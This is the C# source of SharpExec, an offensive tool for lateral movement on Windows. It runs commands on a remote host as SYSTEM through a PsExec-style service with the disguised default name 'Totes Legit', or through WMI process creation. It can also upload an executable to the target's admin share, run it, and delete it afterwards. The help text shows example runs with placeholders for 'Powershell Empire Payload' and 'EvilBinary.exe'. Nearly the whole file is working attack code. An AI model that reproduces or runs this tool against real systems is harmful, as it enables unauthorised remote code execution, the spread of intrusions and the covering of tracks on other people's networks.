using System;
using System.Collections.Generic;
using System.IO;
using System.Management;

namespace SharpExec
{
    class Program
    {
        static void Main(string[] args)
        {
            //Display help menu
            if (args.Length <= 0 || args[0] == "help" || args[0] == "?")
            {
                help();
            }
            else
            {
                //Get args
                var comparer = StringComparer.OrdinalIgnoreCase;
                var arguments = new Dictionary<string, string>(comparer);
                foreach (string argument in args)
                {
                    int idx = argument.IndexOf('=');
                    if (idx > 0)
                        arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                }
                //set variables
                string module = "";
                string rhost = "";
                string domain = "";
                string username = "";
                string password = "";
                string executionPath = "";
                string cmdArgs = "";
                string serviceName = "Legit";
                string serviceDisplayName = "Totes Legit";
                string uploadPath = "";

                //Check if key created and if so set variable
                if (arguments.ContainsKey("-m"))
                {
                    module = arguments["-m"];
                }
                else
                {
                    Console.WriteLine("[-] Missing required argument -m");
                    Console.WriteLine();
                    Console.WriteLine("[-] SharpExec did not run");
                    Environment.Exit(0);
                }
                if (arguments.ContainsKey("-i"))
                {
                    rhost = arguments["-i"];
                }
                else
                {
                    Console.WriteLine("[-] Missing required argument -i");
                    Console.WriteLine();
                    Console.WriteLine("[-] SharpExec did not run");
                    Environment.Exit(0);
                }
                if (arguments.ContainsKey("-e"))
                {
                    executionPath = arguments["-e"];
                }
                else
                {
                    Console.WriteLine("[-] Missing required argument -e");
                    Console.WriteLine();
                    Console.WriteLine("[-] SharpExec did not run");
                    Environment.Exit(0);
                }
                if (arguments.ContainsKey("-d"))
                {
                    domain = arguments["-d"];
                }
                if (arguments.ContainsKey("-u"))
                {
                    username = arguments["-u"];
                }
                if (arguments.ContainsKey("-p"))
                {
                    password = arguments["-p"];
                }
                if (arguments.ContainsKey("-c"))
                {
                    cmdArgs = arguments["-c"];
                }
                if (arguments.ContainsKey("-f"))
                {
                    uploadPath = arguments["-f"];
                }
                if (arguments.ContainsKey("--serviceName"))
                {
                    serviceName = arguments["--serviceName"];
                }
                if (arguments.ContainsKey("--serviceDisplay"))
                {
                    serviceDisplayName = arguments["-serviceDisplay"];
                }
                //Modules
                //Uploads file
                if (uploadPath != "" && executionPath != "" && domain != "" && username != "" && password != "")
                {
                    using (new Impersonation(domain, username, password))
                    {
                        try
                        {
                            upload(uploadPath, executionPath, rhost);
                            System.Threading.Thread.Sleep(3000);
                        }
                        catch
                        {
                            Console.WriteLine("[-] Something went wrong with file upload.  Please check syntax and run again");
                        }
                    }//End Impersonation                    
                }
                else if (uploadPath != "" && executionPath != "")
                {
                    try
                    {
                        upload(uploadPath, executionPath, rhost);
                        System.Threading.Thread.Sleep(3000);
                    }
                    catch
                    {
                        Console.WriteLine("[-] Something went wrong with file upload.  Please check syntax and run again");
                    }
                }
                //Executes psexec module
                if (module.ToLower() == "psexec")
                {
                    try
                    {
                        createService(rhost, serviceName, serviceDisplayName, executionPath, cmdArgs, domain, username, password);
                        //If file was uploaded remove it
                        if (uploadPath != "" && executionPath != "")
                        {
                            System.Threading.Thread.Sleep(3000);
                            delete(executionPath, rhost);
                        }
                    }
                    catch
                    {
                        Console.WriteLine("[-] Something went wrong with PSEXEC module.  Please check syntax and run again.");
                    }
                }
                //Executes wmi module
                else if (module.ToLower() == "wmi")
                {
                    try
                    {
                        wmi(rhost, executionPath, cmdArgs, domain, username, password);

                        //If file was uploaded remove it
                        if (uploadPath != "" && executionPath != "")
                        {
                            Console.WriteLine("[+] Depending on what was executed a process may still be open");
                            Console.WriteLine("[+] Make sure process is not still running then press ENTER to remove file");
                            Console.ReadLine();
                            System.Threading.Thread.Sleep(3000);
                            delete(executionPath, rhost);
                        }
                    }
                    catch
                    {
                        Console.WriteLine("[-] Something went wrong with WMI module.  Please check syntax and run again.");
                    }
                }
                else
                {
                    Console.WriteLine("[-] Something went wrong.  Please check syntax and run again.");
                }
            }//End Else
        }//End Main

        //WMI module
        private static void wmi(string rhost, string executionPath, string cmdArgs, string domain, string username, string password)
        {
            object[] theProcessToRun = { executionPath + " " + cmdArgs };

            if (username == "" && password == "")
            {
                ManagementScope theScope = new ManagementScope(String.Format("\\\\{0}\\root\\cimv2", rhost));
                ManagementClass theClass = new ManagementClass(theScope, new ManagementPath("Win32_Process"), new ObjectGetOptions());
                theClass.InvokeMethod("Create", theProcessToRun);
            }
            else
            {
                ConnectionOptions myConnection = new ConnectionOptions();
                string uname = domain + @"\" + username;
                myConnection.Impersonation = ImpersonationLevel.Impersonate;
                myConnection.EnablePrivileges = true;
                myConnection.Timeout = new TimeSpan(0, 0, 30);
                myConnection.Username = uname;
                myConnection.Password = password;
                ManagementScope theScope = new ManagementScope(String.Format("\\\\{0}\\root\\cimv2", rhost), myConnection);
                ManagementClass theClass = new ManagementClass(theScope, new ManagementPath("Win32_Process"), new ObjectGetOptions());
                theClass.InvokeMethod("Create", theProcessToRun);
            }
        }
        //PSExec module
        private static void createService(string rhost, string serviceName, string serviceDisplayName, string executionPath, string cmdArgs, string domain, string username, string password)
        {
            if (username == "" && password == "")
            {
                using (var scmHandle = NativeMethods.OpenSCManager(rhost, null, NativeMethods.SCM_ACCESS.SC_MANAGER_CREATE_SERVICE))
                {
                    using (
                    var serviceHandle = NativeMethods.CreateService(
                        scmHandle,
                        serviceName,
                        serviceDisplayName,
                        NativeMethods.SERVICE_ACCESS.SERVICE_ALL_ACCESS,
                        NativeMethods.SERVICE_TYPES.SERVICE_WIN32_OWN_PROCESS,
                        NativeMethods.SERVICE_START_TYPES.SERVICE_AUTO_START,
                        NativeMethods.SERVICE_ERROR_CONTROL.SERVICE_ERROR_IGNORE,
                        executionPath + " " + cmdArgs,
                        null,
                        IntPtr.Zero,
                        null,
                        null,
                        null))
                    {
                        try
                        {
                            Console.WriteLine("[+] Starting service");
                            NativeMethods.StartService(serviceHandle, 0, null);
                            Console.WriteLine("[+] Service started successfully");
                            Console.WriteLine();
                        }
                        catch
                        {
                            Console.WriteLine("[-] Error starting service");
                            Console.WriteLine();
                            Console.WriteLine("[-] Please check that you have appropriate rights and/or that service doesn't already exist");
                        }
                        try
                        {
                            Console.WriteLine("[+] Removing service");
                            Console.WriteLine();
                            System.Threading.Thread.Sleep(5000);
                            NativeMethods.DeleteService(serviceHandle);
                            Console.WriteLine("[+] Removed service successfully");
                            Console.WriteLine();
                        }
                        catch
                        {
                            Console.WriteLine("[-] Error removing service");
                            Console.WriteLine();
                            Console.WriteLine("[-] Please delete service manually");
                            Console.WriteLine();
                        }
                    }
                }
            }
            else
            {
                using (new Impersonation(domain, username, password))
                {
                    using (var scmHandle = NativeMethods.OpenSCManager(rhost, null, NativeMethods.SCM_ACCESS.SC_MANAGER_CREATE_SERVICE))
                    {
                        using (
                        var serviceHandle = NativeMethods.CreateService(
                            scmHandle,
                            serviceName,
                            serviceDisplayName,
                            NativeMethods.SERVICE_ACCESS.SERVICE_ALL_ACCESS,
                            NativeMethods.SERVICE_TYPES.SERVICE_WIN32_OWN_PROCESS,
                            NativeMethods.SERVICE_START_TYPES.SERVICE_AUTO_START,
                            NativeMethods.SERVICE_ERROR_CONTROL.SERVICE_ERROR_IGNORE,
                            executionPath + " " + cmdArgs,
                            null,
                            IntPtr.Zero,
                            null,
                            null,
                            null))
                        {
                            try
                            {
                                Console.WriteLine("[+] Starting service");
                                NativeMethods.StartService(serviceHandle, 0, null);
                                Console.WriteLine("[+] Service started successfully");
                                Console.WriteLine();
                            }
                            catch
                            {
                                Console.WriteLine("[-] Error starting service");
                                Console.WriteLine();
                                Console.WriteLine("[-] Please check that you have appropriate rights and/or that service doesn't already exist");
                            }
                            try
                            {
                                Console.WriteLine("[+] Removing service");
                                Console.WriteLine();
                                System.Threading.Thread.Sleep(5000);
                                NativeMethods.DeleteService(serviceHandle);
                                Console.WriteLine("[+] Removed service successfully");
                                Console.WriteLine();
                            }
                            catch
                            {
                                Console.WriteLine("[-] Error removing service");
                                Console.WriteLine();
                                Console.WriteLine("[-] Please delete service manually");
                                Console.WriteLine();
                            }
                        }
                    }
                }
            }
        }
        //Upload method
        private static void upload(string uploadPath, string executionPath, string rhost)
        {
            try
            {
                string share = executionPath.Replace(":", "$");
                string destpath = @"\\" + rhost + @"\" + share;
                Console.WriteLine("[+] Grabbing file from " + uploadPath);
                Console.WriteLine();
                Console.WriteLine("[+] Uploading to " + destpath);
                File.Copy(uploadPath, destpath);
                Console.WriteLine("[+] File uploaded successfully");
            }
            catch
            {
                Console.WriteLine("[-] File upload failed, check to make sure both directory paths and credentials are correct");
            }
        }
        //File Removal Method
        private static void delete(string executionPath, string rhost)
        {
            try
            {
                string share = executionPath.Replace(":", "$");
                string destpath = @"\\" + rhost + @"\" + share;
                Console.WriteLine("[+] Deleting " + destpath);
                File.Delete(destpath);
                Console.WriteLine("[+] File removed successfully");
                Console.WriteLine();
            }
            catch
            {
                Console.WriteLine("[-] File was not removed.  Please remove manually");
            }
        }
        //Help method
        private static void help()
        {
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("SharpExec Flags");
            Console.WriteLine("---------------");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("Flags                Required    Description");
            Console.WriteLine("-----                --------    -----------");
            Console.WriteLine("-m                   True        Set Module [psexec,wmi], -m=psexec");
            Console.WriteLine("-i                   True        Set rhost, -i=192.168.0.10");
            Console.WriteLine("-e                   True        Set execution path, -e=C:\\Windows\\System32\\cmd.exe");
            Console.WriteLine("-d                   False       Set domain, -d=MyDomain");
            Console.WriteLine("-u                   False       Set username, -u=TargetUser");
            Console.WriteLine("-p                   False       Set password, -p=MyP@ssw0rd!");
            Console.WriteLine("-c                   False       Set command arguments, -c=" + "\"" + "All Your Args Here" + "\"");
            Console.WriteLine("-f                   False       Set local file location to upload, -f=" + "\"" + "C:\\Users\\My User\\Desktop\\Evil.exe" + "\"");
            Console.WriteLine("--serviceName        False       Set service name for psexec module, default set to Legit");
            Console.WriteLine("--serviceDisplay     False       Set service display name for psexec module, default set to Totes Legit Service");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("Examples - more found on github page");
            Console.WriteLine("-----------------------------------");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("Execute remote commands as nt/system user via native psexec functionality - requires admin");
            Console.WriteLine("------------------------------------------------------------------------------------------");
            Console.WriteLine();
            Console.WriteLine(@"c:\> SharpExec.exe -m=psexec -i=192.168.0.10 -d=MyDomain -u=MyUser -p=MyP@ssw0rd -e=C:\Windows\System32\cmd.exe -c=" + "\"" + "/c <Powershell Empire Payload>" + "\"");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("Execute remote commands via WMI - requires admin");
            Console.WriteLine("------------------------------------------------");
            Console.WriteLine();
            Console.WriteLine(@"c:\> SharpExec.exe -m=wmi -i=192.168.0.10 -d=MyDomain -u=MyUser -p=MyP@ssw0rd -e=C:\Windows\System32\cmd.exe -c=" + "\"" + "/c <Powershell Empire Payload>" + "\"");
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine("Upload local binary and execute it as nt/system user via native psexec functionality - requires admin");
            Console.WriteLine("-----------------------------------------------------------------------------------------------------");
            Console.WriteLine();
            Console.WriteLine(@"c:\> SharpExec.exe -m=psexec -i=192.168.0.10 -d=MyDomain -u=MyUser -p=MyP@ssw0rd -f=" + "\"" + @"C:\Users\My User\Desktop\EvilBinary.exe" + "\"" + @"-e=C:\Users\TargetUser\Desktop\EvilBinary.exe -c=" + "\"" + "My Args Here" + "\"");
            Console.WriteLine();
            Console.WriteLine();
        }//End help method
    }//End Program
}//End namespace
